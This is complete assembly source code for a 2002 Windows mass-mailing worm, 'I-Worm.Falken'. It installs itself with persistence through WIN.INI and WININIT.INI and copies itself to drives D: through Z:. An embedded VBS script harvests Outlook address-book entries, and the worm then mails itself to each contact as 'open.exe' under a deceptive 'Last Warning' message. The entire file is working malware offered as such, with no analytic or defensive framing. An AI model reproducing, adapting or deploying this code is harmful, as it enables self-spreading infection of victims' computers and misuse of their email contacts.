; comment #
; Name : I-Worm.Falken
; Author : PetiK
; Date : February 5th 2002 - February 8th 2002
; Size : 6144
;
; Action :
; #

.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

include Useful.inc

start_worm:
    @pushsz "KERNEL32.DLL"
    api GetModuleHandleA
    xchg    eax,ebx

kern    macro x
    push    offset sz&x
    push    ebx
    api GetProcAddress
    mov _ptk&x,eax
    endm

    kern    CloseHandle
    kern    CopyFileA
    kern    CreateFileA
    kern    CreateFileMappingA
    kern    DeleteFileA
    kern    GetFileSize
    kern    GetModuleFileNameA
    kern    GetSystemDirectoryA
    kern    GetTickCount
    kern    GetWindowsDirectoryA
    kern    lstrcat
    kern    MapViewOfFile
    kern    SetCurrentDirectoryA
    kern    SetFilePointer
    kern    Sleep
    kern    UnmapViewOfFile
    kern    WinExec
    kern    WriteFile
    kern    WritePrivateProfileStringA
    kern    WriteProfileStringA

    push    50
    mov esi,offset orig_worm
    push    esi
    push    0
    call    _ptkGetModuleFileNameA

    mov edi,offset copy_worm
    push    edi
    push    50
    push    edi
    call    _ptkGetSystemDirectoryA
    add edi,eax
    mov al,"\"
    stosb
    call    _ptkGetTickCount
    push    9
    pop ecx
    xor edx,edx
    div ecx
    inc edx
    mov ecx,edx
    copy_g:
    push    ecx
    call    _ptkGetTickCount
    push    'z'-'a'
    pop ecx
    xor edx,edx
    div ecx
    xchg    eax,edx
    add al,'a'
    stosb
    call    _ptkGetTickCount
    push    100
    pop ecx
    xor edx,edx
    div ecx
    push    edx
    call    _ptkSleep
    pop ecx
    loop    copy_g
    mov eax,"exe."
    stosd
    pop edi

    push    50
    push    offset wininit
    call    _ptkGetWindowsDirectoryA
    @pushsz "\WININIT.INI"
    push    offset wininit
    call    _ptklstrcat
    push    offset wininit
    push    esi
    @pushsz "NUL"
    @pushsz "rename"
    call    _ptkWritePrivateProfileStringA

copy_w: push    0
    push    edi
    push    esi
    call    _ptkCopyFileA

run_w:  push    edi
    @pushsz "RUN"
    @pushsz "WINDOWS"
    call    _ptkWriteProfileStringA

spread_system:
    call    @lect
    db  "D:\",0
    db  "E:\",0
    db  "F:\",0
    db  "G:\",0
    db  "H:\",0
    db  "I:\",0
    db  "J:\",0
    db  "K:\",0
    db  "L:\",0
    db  "M:\",0
    db  "N:\",0
    db  "O:\",0
    db  "P:\",0
    db  "Q:\",0
    db  "R:\",0
    db  "S:\",0
    db  "T:\",0
    db  "U:\",0
    db  "V:\",0
    db  "W:\",0
    db  "X:\",0
    db  "Y:\",0
    db  "Z:\",0
    @lect:
    pop esi
    push    23
    pop ecx
    loop_lect:
    push    ecx
    push    esi
    call    _ptkSetCurrentDirectoryA
    push    0
    @pushsz "winbackup.exe"
    push    offset orig_worm
    call    _ptkCopyFileA
    @endsz
    pop ecx
    loop    loop_lect
end_spread_system:

payload:
    call    _ptkGetTickCount
    xor edx,edx 
    mov ecx,20
    div ecx
    cmp edx,2
    jne end_payload
    push    10h
    @pushsz "I-Worm.Falken"
    call    @messpay
    db  "This is the last warning before the attack.",CRLF
    db  "United States have to stop controling the world.",0
    @messpay:
    push    0
    api MessageBoxA
    end_payload:

prep_spread_worm:
    push    0
    push    20h
    push    2
    push    0
    push    1
    push    40000000h
    @pushsz "C:\falken.vbs"
    call    _ptkCreateFileA
    xchg    eax,ebx
    push    0
    push    offset octets
    push    e_vbs - s_vbs
    push    offset s_vbs
    push    ebx
    call    _ptkWriteFile
    push    ebx
    call    _ptkCloseHandle
    push    1
    @pushsz "wscript C:\falken.vbs"
    call    _ptkWinExec
    push    2000
    call    _ptkSleep
    @pushsz "C:\falken.vbs"
    call    _ptkDeleteFileA

verif_inet:
    push    0
    push    offset inet
    api InternetGetConnectedState
    dec eax
    jnz verif_inet

    push    50
    push    offset syspath
    call    _ptkGetSystemDirectoryA
    push    offset syspath
    call    _ptkSetCurrentDirectoryA

spread: pushad
    push    00h
    push    80h
    push    03h
    push    00h
    push    01h
    push    80000000h
    @pushsz "falkenspread.txt"
    call    _ptkCreateFileA
    inc eax
    je  end_spread
    dec eax
    xchg    eax,ebx

    xor eax,eax
    push    eax
    push    eax
    push    eax
    push    2
    push    eax
    push    ebx
    call    _ptkCreateFileMappingA
    test    eax,eax
    je  end_s1
    xchg    eax,ebp

    xor eax,eax
    push    eax
    push    eax
    push    eax
    push    4
    push    ebp
    call    _ptkMapViewOfFile
    test    eax,eax
    je  end_s2
    xchg    eax,esi

    push    0
    push    ebx
    call    _ptkGetFileSize
    cmp eax,4
    jbe end_s3

scan_mail:
    xor edx,edx
    mov edi,offset mail_addr
    push    edi
    p_c:    lodsb
    cmp al," "
    je  car_s
    cmp al,";"
    je  end_m
    cmp al,"#"
    je  f_mail
    cmp al,'@'
    jne not_a
    inc edx
    not_a:  stosb
        jmp p_c
    car_s:  inc esi
        jmp p_c
    end_m:  mov counter,0
    end_l:  xor al,al
        stosb
        inc counter
        cmp counter,20
        jne end_l
        pop edi
        test edx,edx
        je  scan_mail
        call send_mail
        jmp scan_mail
    f_mail:

end_s3: push    esi
    call    _ptkUnmapViewOfFile
end_s2: push    ebp
    call    _ptkCloseHandle
end_s1: push    ebx
    call    _ptkCloseHandle
end_spread: popad

    @pushsz "falkenspread.txt"
    call    _ptkDeleteFileA

end_worm:
    push    0
    api ExitProcess

send_mail:
    xor eax,eax
    push    eax
    push    eax
    push    offset Message
    push    eax
    push    [sess]
    api MAPISendMail

    push    0
    push    80h
    push    4
    push    0
    push    1
    push    40000000h
    @pushsz "falkenliste.txt"
    call    _ptkCreateFileA
    xchg    eax,ebx

    push    2
    push    0
    push    0
    push    ebx
    call    _ptkSetFilePointer

    push    0
    push    offset octets
    push    e_liste - s_liste
    push    offset s_liste
    push    ebx
    call    _ptkWriteFile
    push    ebx
    call    _ptkCloseHandle
    ret



.data
copy_worm   db 50 dup (0)
orig_worm   db 50 dup (0)
wininit     db 50 dup (0)
lect        db 50 dup (0)
syspath     db 50 dup (0)
octets      dd ?
counter     dd ?
inet        dd 0
sess        dd 0

subject     db "Last Warning !",0
body        db "Message for Everybody,",CRLF
        db "Open this file to see what we speak about.",CRLF,CRLF
        db 9,"Best Regards",0
filename    db "open.exe",0

Message     dd ?
        dd offset subject
        dd offset body
        dd ?
        dd ?
        dd ?
        dd 2
        dd offset MsgFrom
        dd 1
        dd offset MsgTo
        dd 1
        dd offset Attach

MsgFrom     dd ?
        dd ?
        dd ?
        dd ?
        dd ?
        dd ?

MsgTo       dd ?
        dd 1
        dd offset mail_addr
        dd offset mail_addr
        dd ?
        dd ?

Attach      dd ?
        dd ?
        dd ?
        dd offset orig_worm
        dd offset filename
        dd ?


szCloseHandle           db "CloseHandle",0
szCopyFileA         db "CopyFileA",0
szCreateFileA           db "CreateFileA",0
szCreateFileMappingA        db "CreateFileMappingA",0
szDeleteFileA           db "DeleteFileA",0
szGetFileSize           db "GetFileSize",0
szGetModuleFileNameA        db "GetModuleFileNameA",0
szGetSystemDirectoryA       db "GetSystemDirectoryA",0
szGetTickCount          db "GetTickCount",0
szGetWindowsDirectoryA      db "GetWindowsDirectoryA",0
szlstrcat           db "lstrcat",0
szMapViewOfFile         db "MapViewOfFile",0
szSetCurrentDirectoryA      db "SetCurrentDirectoryA",0
szSetFilePointer        db "SetFilePointer",0
szSleep             db "Sleep",0
szUnmapViewOfFile       db "UnmapViewOfFile",0
szWinExec           db "WinExec",0
szWriteFile         db "WriteFile",0
szWritePrivateProfileStringA    db "WritePrivateProfileStringA",0
szWriteProfileStringA       db "WriteProfileStringA",0

_ptkCloseHandle         dd ?
_ptkCopyFileA           dd ?
_ptkCreateFileA         dd ?
_ptkCreateFileMappingA      dd ?
_ptkDeleteFileA         dd ?
_ptkGetFileSize         dd ?
_ptkGetModuleFileNameA      dd ?
_ptkGetSystemDirectoryA     dd ?
_ptkGetTickCount        dd ?
_ptkGetWindowsDirectoryA    dd ?
_ptklstrcat         dd ?
_ptkMapViewOfFile       dd ?
_ptkSetCurrentDirectoryA    dd ?
_ptkSetFilePointer      dd ?
_ptkSleep           dd ?
_ptkUnmapViewOfFile     dd ?
_ptkWinExec         dd ?
_ptkWriteFile           dd ?
_ptkWritePrivateProfileStringA  dd ?
_ptkWriteProfileStringA     dd ?

s_vbs:  db 'On Error Resume Next',CRLF
    db 'Set fs=CreateObject("Scripting.FileSystemObject")',CRLF
    db 'Set sys=fs.GetSpecialFolder(1)',CRLF
    db 'Set c=fs.CreateTextFile(sys&"\falkenspread.txt")',CRLF
    db 'c.Close',CRLF
    db 'Set ou=CreateObject("Outlook.Application")',CRLF
    db 'Set map=ou.GetNameSpace("MAPI")',CRLF
    db 'adr=""',CRLF
    db 'For Each mel in map.AddressLists',CRLF
    db 'If mel.AddressEntries.Count <> 0 Then',CRLF
    db 'For O=1 To mel.AddressEntries.Count',CRLF
    db 'adr=adr &";"& mel.AddressEntries(O).Address',CRLF
    db 'Next',CRLF
    db 'End If',CRLF
    db 'Next',CRLF
    db 'adr=adr &";#"',CRLF,CRLF
    db 'Set c=fs.OpenTextFile(sys&"\falkenspread.txt",2)',CRLF
    db 'c.WriteLine adr',CRLF
    db 'c.Close',CRLF
e_vbs:

s_liste:
db  "mailto : > "
mail_addr   db 50 dup (0)
db  " ",CRLF
e_liste:

end start_worm
end
